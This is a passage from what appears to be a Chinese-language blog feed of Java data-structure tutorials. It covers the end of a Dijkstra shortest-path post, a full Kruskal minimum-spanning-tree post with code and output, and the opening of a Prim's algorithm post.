class="type">int</span>[] dist;<span class="comment">// dist[i]是&quot;顶点startVertex&quot;到&quot;顶点i&quot;的最短路径的长度。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化构造器</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Dijkstra</span><span class="params">(Graph graph, <span class="type">int</span> startVertex)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.startVertex = startVertex;</span><br><span class="line"><span class="built_in">this</span>.graph = graph;</span><br><span class="line"><span class="built_in">this</span>.visited = <span class="keyword">new</span> <span class="title class_">int</span>[graph.vertex.length];</span><br><span class="line"><span class="built_in">this</span>.prev = <span class="keyword">new</span> <span class="title class_">int</span>[graph.vertex.length];</span><br><span class="line"><span class="built_in">this</span>.dist = <span class="keyword">new</span> <span class="title class_">int</span>[graph.vertex.length];</span><br><span class="line"></span><br><span class="line">visited[startVertex] = <span class="number">1</span>;<span class="comment">// 标记源点已被访问</span></span><br><span class="line"></span><br><span class="line">Arrays.fill(dist, <span class="number">65535</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; graph.matrix[startVertex].length; i++) &#123;<span class="comment">// 初始化源点到各顶点距离</span></span><br><span class="line"><span class="keyword">if</span> (graph.matrix[startVertex][i] &lt; dist[i]) &#123;</span><br><span class="line">dist[i] = graph.matrix[startVertex][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">dist[startVertex] = <span class="number">0</span>;<span class="comment">// 标记源点到自己的距离为0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; prev.length; i++) &#123;<span class="comment">// 将其他顶点的前驱顶点都指向源点</span></span><br><span class="line"><span class="keyword">if</span> (i != startVertex) &#123;</span><br><span class="line">prev[i] = startVertex;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">prev[startVertex] = -<span class="number">1</span>;<span class="comment">//源点的前驱顶点为-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 核心算法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dijkstra</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>; n &lt; graph.vertex.length - <span class="number">1</span>; n++) &#123;<span class="comment">// 有n-1个需要计算顶点到源点距离</span></span><br><span class="line"><span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">minDist</span> <span class="operator">=</span> <span class="number">65535</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; dist.length; i++) &#123;<span class="comment">// 找到距离最短的顶点</span></span><br><span class="line"><span class="keyword">if</span> (dist[i] &lt; minDist &amp;&amp; dist[i] != <span class="number">0</span> &amp;&amp; visited[i] != <span class="number">1</span>) &#123;</span><br><span class="line">min = i;</span><br><span class="line">minDist = dist[min];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">visited[min] = <span class="number">1</span>;<span class="comment">// 标记该顶点为已访问</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; graph.matrix[min].length; i++) &#123;<span class="comment">// 更新其它顶点的距离</span></span><br><span class="line"><span class="keyword">if</span> (graph.matrix[min][i] + dist[min] &lt; dist[i] &amp;&amp; visited[i] == <span class="number">0</span>) &#123;</span><br><span class="line">dist[i] = graph.matrix[min][i] + dist[min];</span><br><span class="line">prev[i] = min;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">System.out.print(<span class="string">&quot;visited数组：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : visited) &#123;</span><br><span class="line">System.out.print(i + <span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">System.out.print(<span class="string">&quot;prev数组：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : prev) &#123;</span><br><span class="line">System.out.print(i + <span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">System.out.print(<span class="string">&quot;dist数组：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : dist) &#123;</span><br><span class="line">System.out.print(i + <span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>[] vertex = &#123; <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span> &#125;;</span><br><span class="line">System.out.print(vertex[startVertex] + <span class="string">&quot; 到各个顶点的最短距离：&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : dist) &#123;</span><br><span class="line"><span class="keyword">if</span> (i != <span class="number">65535</span>) &#123;</span><br><span class="line">System.out.print(vertex[count] + <span class="string">&quot;(&quot;</span> + i + <span class="string">&quot;) &quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(vertex[count] + <span class="string">&quot;(N) &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>visited数组：1 1 1 1 1 1 1<br>prev数组：6 6 0 5 6 6 -1<br>dist数组：2 3 9 10 4 6 0<br>G 到各个顶点的最短距离：A(2) B(3) C(9) D(10) E(4) F(6) G(0) </p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215704.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 迪杰斯特拉算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>克鲁斯卡尔算法</title>
      <link href="/posts/c7ee/"/>
      <url>/posts/c7ee/</url>
      
        <content type="html"><![CDATA[<h1 id="克鲁斯卡尔算法"><a href="#克鲁斯卡尔算法" class="headerlink" title="克鲁斯卡尔算法"></a>克鲁斯卡尔算法</h1><h2 id="应用场景-公交站问题"><a href="#应用场景-公交站问题" class="headerlink" title="应用场景-公交站问题"></a>应用场景-公交站问题</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200826203459.png"></p><p>某城市新增7个站点(A, B, C, D, E, F, G) ，现在需要修路把7个站点连通</p><p>各个站点的距离用边线表示(权) ，比如 A – B 距离 12公里</p><p>问：如何修路保证各个站点都能连通，并且总的修建公路总里程最短?</p><h2 id="克鲁斯卡尔算法基本介绍"><a href="#克鲁斯卡尔算法基本介绍" class="headerlink" title="克鲁斯卡尔算法基本介绍"></a>克鲁斯卡尔算法基本介绍</h2><p>克鲁斯卡尔(Kruskal)算法，是用来求加权连通图的最小生成树的算法。</p><p><strong>基本思想：按照权值从小到大的顺序选择n-1条边，并保证这n-1条边不构成回路。</strong></p><p>具体做法：首先构造一个只含n个顶点的森林，然后依权值从小到大从连通网中选择边加入到森林中，并使森林中不产生回路，直至森林变成一棵树为止。</p><hr><p>图解思路如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215031.png"></p><p>此时，最小生成树构造完成！它包括的边依次是：**&lt;E,F&gt; &lt;C,D&gt; &lt;D,E&gt; &lt;B,F&gt; &lt;E,G&gt; &lt;A,B&gt;**。</p><h2 id="Kruskal算法重点需要解决的两个问题"><a href="#Kruskal算法重点需要解决的两个问题" class="headerlink" title="Kruskal算法重点需要解决的两个问题"></a>Kruskal算法重点需要解决的两个问题</h2><p><strong>问题一 ：对图的所有边按照权值大小进行排序。<br>问题二 ：将边添加到最小生成树中时，怎么样判断是否形成了回路。</strong></p><p>问题一，很好解决，采用排序算法进行排序即可。</p><p>问题二，处理方式是：记录顶点在”最小生成树”中的终点，顶点的终点是”在最小生成树中与它连通的最大顶点”。然后每次需要将一条边添加到最小生存树时，判断<strong>该边的两个顶点的终点是否重合</strong>，重合的话则会构成回路。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214948.png"></p><p>在将&lt;E,F&gt; &lt;C,D&gt; &lt;D,E&gt;加入到最小生成树R中之后，这几条边的顶点就都有了终点：</p><blockquote><p>(01) C的终点是F。<br>(02) D的终点是F。<br>(03) E的终点是F。<br>(04) F的终点是F。</p></blockquote><p>关于终点的说明： 就是将所有顶点按照从小到大的顺序排列好之后；某个顶点的终点就是”与它连通的最大顶点”。 </p><p>因此，接下来，虽然&lt;C,E&gt;是权值最小的边。但是C和E的终点都是F，即它们的终点相同，因此，将&lt;C,E&gt;加入最小生成树的话，会形成回路。这就是判断回路的方式。</p><p><strong>这个终点的概念不太好理解，我看完韩顺平老师视频的代码后有点懵，这里应该引入个概念：并查集，所以学习代码前先学习并查集，于是找了篇博客和视频帮助了解。</strong></p><p><a href="https://blog.csdn.net/qq_41593380/article/details/81146850?utm_medium=distribute.pc_relevant.none-task-blog-title-1&spm=1001.2101.3001.4242">CSDN：并查集详解（超级简单有趣~~就学会了）</a></p><p><a href="https://www.bilibili.com/video/BV13t411v7Fs?p=1">B站：【算法】并查集（Disjoint Set）[共3讲]</a></p><h2 id="公交站问题的代码实现"><a href="#公交站问题的代码实现" class="headerlink" title="公交站问题的代码实现"></a>公交站问题的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.kruskal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KruskalCase</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> EData[] edges; <span class="comment">// 图中的边</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> edgeNum; <span class="comment">// 边的个数</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">char</span>[] vertexs; <span class="comment">// 顶点数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span>[][] matrix; <span class="comment">// 邻接矩阵</span></span><br><span class="line"><span class="comment">// 使用 INF 表示两个顶点不能连通</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">INF</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">char</span>[] vertexs = &#123; <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// 克鲁斯卡尔算法的邻接矩阵</span></span><br><span class="line"><span class="type">int</span> matrix[][] = &#123;</span><br><span class="line">      <span class="comment">/*A*/</span><span class="comment">/*B*/</span><span class="comment">/*C*/</span><span class="comment">/*D*/</span><span class="comment">/*E*/</span><span class="comment">/*F*/</span><span class="comment">/*G*/</span></span><br><span class="line"><span class="comment">/*A*/</span> &#123;   <span class="number">0</span>,  <span class="number">12</span>, INF, INF, INF,  <span class="number">16</span>,  <span class="number">14</span>&#125;,</span><br><span class="line"><span class="comment">/*B*/</span> &#123;  <span class="number">12</span>,   <span class="number">0</span>,  <span class="number">10</span>, INF, INF,   <span class="number">7</span>, INF&#125;,</span><br><span class="line"><span class="comment">/*C*/</span> &#123; INF,  <span class="number">10</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">5</span>,   <span class="number">6</span>, INF&#125;,</span><br><span class="line"><span class="comment">/*D*/</span> &#123; INF, INF,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">4</span>, INF, INF&#125;,</span><br><span class="line"><span class="comment">/*E*/</span> &#123; INF, INF,   <span class="number">5</span>,   <span class="number">4</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">8</span>&#125;,</span><br><span class="line"><span class="comment">/*F*/</span> &#123;  <span class="number">16</span>,   <span class="number">7</span>,   <span class="number">6</span>, INF,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">9</span>&#125;,</span><br><span class="line"><span class="comment">/*G*/</span> &#123;  <span class="number">14</span>, INF, INF, INF,   <span class="number">8</span>,   <span class="number">9</span>,   <span class="number">0</span>&#125;&#125;; </span><br><span class="line"></span><br><span class="line"><span class="type">KruskalCase</span> <span class="variable">kruskalCase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">KruskalCase</span>(vertexs, matrix);</span><br><span class="line">kruskalCase.kruskal();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造器</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">KruskalCase</span><span class="params">(<span class="type">char</span>[] vertexs, <span class="type">int</span>[][] matrix)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.vertexs = vertexs;</span><br><span class="line"><span class="built_in">this</span>.matrix = matrix;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; vertexs.length; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; vertexs.length; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.matrix[i][j] != INF) &#123;</span><br><span class="line">edgeNum++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">edges = <span class="keyword">new</span> <span class="title class_">EData</span>[edgeNum];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; vertexs.length; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; vertexs.length; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.matrix[i][j] != INF) &#123;</span><br><span class="line">edges[index++] = <span class="keyword">new</span> <span class="title class_">EData</span>(vertexs[i], vertexs[j], matrix[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回顶点对应的下标</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getPosition</span><span class="params">(<span class="type">char</span> ch)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; vertexs.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (vertexs[i] == ch) &#123;<span class="comment">// 找到</span></span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 功能: 获取下标为i的顶点的终点，用于后面判断两个顶点的终点是否相同</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getEnd</span><span class="params">(<span class="type">int</span>[] parent, <span class="type">int</span> i)</span> &#123; </span><br><span class="line"><span class="keyword">while</span> (parent[i] != <span class="number">0</span>) &#123;</span><br><span class="line">i = parent[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">kruskal</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//用于保存&quot;已有最小生成树&quot; 中的每个顶点在最小生成树中的终点</span></span><br><span class="line"><span class="type">int</span>[] parent = <span class="keyword">new</span> <span class="title class_">int</span>[vertexs.length];</span><br><span class="line"></span><br><span class="line"><span class="comment">//按照边的权值大小进行排序(从小到大)</span></span><br><span class="line">ArrayList&lt;EData&gt; edgesList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;EData&gt;();</span><br><span class="line">Collections.addAll(edgesList, edges);</span><br><span class="line">Collections.sort(edgesList);</span><br><span class="line">System.out.println(edgesList);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建结果数组, 保存最后的最小生成树</span></span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">EData[] rets = <span class="keyword">new</span> <span class="title class_">EData</span>[edgeNum];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; edges.length; i++) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">p1</span> <span class="operator">=</span> getPosition(edgesList.get(i).start);</span><br><span class="line"><span class="type">int</span> <span class="variable">p2</span> <span class="operator">=</span> getPosition(edgesList.get(i).end);</span><br><span class="line"><span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> getEnd(parent, p1);</span><br><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> getEnd(parent, p2);</span><br><span class="line"><span class="keyword">if</span> (m != n) &#123;</span><br><span class="line">parent[m]=n;</span><br><span class="line">rets[index++] = edgesList.get(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &lt;E,F&gt; &lt;C,D&gt; &lt;D,E&gt; &lt;B,F&gt; &lt;E,G&gt; &lt;A,B&gt;。</span></span><br><span class="line"><span class="comment">// 统计并打印 &quot;最小生成树&quot;, 输出 rets</span></span><br><span class="line">System.out.println(<span class="string">&quot;最小生成树为&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">System.out.println(rets[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个类EData ，它的对象实例就表示一条边</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EData</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span>&lt;EData&gt; &#123;</span><br><span class="line"><span class="type">char</span> start; <span class="comment">// 边的一个点</span></span><br><span class="line"><span class="type">char</span> end; <span class="comment">// 边的另外一个点</span></span><br><span class="line"><span class="type">int</span> weight; <span class="comment">// 边的权值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">EData</span><span class="params">(<span class="type">char</span> start, <span class="type">char</span> end, <span class="type">int</span> weight)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.start = start;</span><br><span class="line"><span class="built_in">this</span>.end = end;</span><br><span class="line"><span class="built_in">this</span>.weight = weight;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;EData [&lt;&quot;</span> + start + <span class="string">&quot;, &quot;</span> + end + <span class="string">&quot;&gt;= &quot;</span> + weight + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(EData o)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.weight - o.weight;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>[EData [&lt;E, F&gt;&#x3D; 2], EData [&lt;C, D&gt;&#x3D; 3], EData [&lt;D, E&gt;&#x3D; 4], EData [&lt;C, E&gt;&#x3D; 5], EData [&lt;C, F&gt;&#x3D; 6], EData [&lt;B, F&gt;&#x3D; 7], EData [&lt;E, G&gt;&#x3D; 8], EData [&lt;F, G&gt;&#x3D; 9], EData [&lt;B, C&gt;&#x3D; 10], EData [&lt;A, B&gt;&#x3D; 12], EData [&lt;A, G&gt;&#x3D; 14], EData [&lt;A, F&gt;&#x3D; 16]]<br>最小生成树为<br>EData [&lt;E, F&gt;&#x3D; 2]<br>EData [&lt;C, D&gt;&#x3D; 3]<br>EData [&lt;D, E&gt;&#x3D; 4]<br>EData [&lt;B, F&gt;&#x3D; 7]<br>EData [&lt;E, G&gt;&#x3D; 8]<br>EData [&lt;A, B&gt;&#x3D; 12]</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 克鲁斯卡尔算法 </tag>
            
            <tag> 并查集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>普里姆算法</title>
      <link href="/posts/6e5f/"/>
      <url>/posts/6e5f/</url>
      
        <content type="html"><![CDATA[<h1 id="普里姆算法"><a href="#普里姆算法" class="headerlink" title="普里姆算法"></a>普里姆算法</h1><h2 id="应用场景-修路问题"><a href="#应用场景-修路问题" class="headerlink" title="应用场景-修路问题"></a>应用场景-修路问题</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215704.png"></p><p>胜利乡有7个村庄(A, B, C, D, E, F, G) ，现在需要修路把7个村庄连通，</p><p>各个村庄的距离用边线表示(权) ，比如 A – B 距离 5公里，</p><p>问：如何修路保证各个村庄都能连通，并且总的修建公路总里程最短?</p><p>正确的思路，就是<strong>尽可能的选择少的路线，并且每条路线最小</strong>，保证总里程数最少。</p><h2 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h2><p>修路问题本质就是就是最小生成树问题， 先介绍一下最小生成树(Minimum Cost Spanning Tree)，简称<strong>MST</strong>。</p><ul><li>给定一个带权的无向连通图,如何选取一棵生成树,使树上所有边上权的总和为最小,这叫最小生成树 </li><li>N个顶点，<strong>一定有N-1条边</strong></li><li>包含全部顶点</li><li>N-1条边都在图中</li><li>求最小生成树的算法主要是普里姆算法和克鲁斯卡尔算法</li></ul><h2 id="普里姆算法基本介绍"><a href="#普里姆算法基本介绍" class="headerlink" title="普里姆算法基本介绍"></a>普里姆算法基本介绍</h2><p>普利姆(Prim)算法求最小生成树，也就是在包含n个顶点的连通图中，找出只有(n-1)条边包含所有n个顶点的连通子图，也就是所谓的极小连通子图。</p><hr><p>普利姆的算法如下:</p><blockquote><ol><li>设G&#x3D;(V,E)是连通网，T&#x3D;(U,D)是最小生成树，V,U是顶点集合，E,D是边的集合 </li><li>若从顶点u开始构造最小生成树，则从集合V中取出顶点u放入集合U中，标记顶点v的visited[u]&#x3D;1</li><li>若集合U中<strong>顶点u</strong>与集合V中的顶点之间存在边，则寻找这些边中权值最小的边，但<strong>不能构成回路</strong>，找到时将另一个顶点v加入集合U中，将边（u,v）加入集合D中，标记visited[v]&#x3D;1</li><li>若集合U中<strong>顶点u和顶点v</strong>与集合V中的顶点之间存在边，则寻找这些边中权值最小的边，但不能构成回路，找到时将另一个顶点加入集合U中，将对应的边加入集合D中，同时标记该顶点为已访问</li><li>重复步骤，直到U与V相等，即所有顶点都被标记为访问过，此时D中有n-1条边</li></ol></blockquote><hr><p>图解思路如下：</p><p>1.从顶点V0开始构造生成树，在与V0相连的V1，V5中找到权值最小的边，所以将V0和V1相连。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200825002705.png"></p><p>2.在与V0和V1相连的V2，V8，V6，V5中找到权值最小的边，所以将V1和V8相连。</p><p>​                                                               <img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200825002717.png"></p><p>3.通过不断的转换，构造的过程如图（<strong>不能构成回路</strong>）：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200825002751.png"></p><h2 id="修路问题的代码实现"><a href="#修路问题的代码实现" class="headerlink" title="修路问题的代码实现"></a>修路问题的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 